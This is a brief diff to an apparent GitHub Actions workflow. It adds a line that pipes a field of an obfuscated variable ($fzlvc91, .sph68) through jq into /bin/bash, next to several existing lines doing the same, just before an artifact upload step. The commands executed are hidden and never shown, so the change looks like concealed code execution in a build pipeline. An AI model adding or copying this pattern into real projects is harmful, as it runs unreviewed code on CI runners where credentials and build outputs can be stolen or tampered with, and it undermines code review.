@@ -31,6 +31,7 @@ jobs:
           echo $jxijk862 | jq -r .oicll49 | /bin/bash
           echo $z9 | jq -r .t4 | /bin/bash
           echo $obd07184 | jq -r .i105 | /bin/bash
+          printf '%s' "$fzlvc91" | jq -r .sph68 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
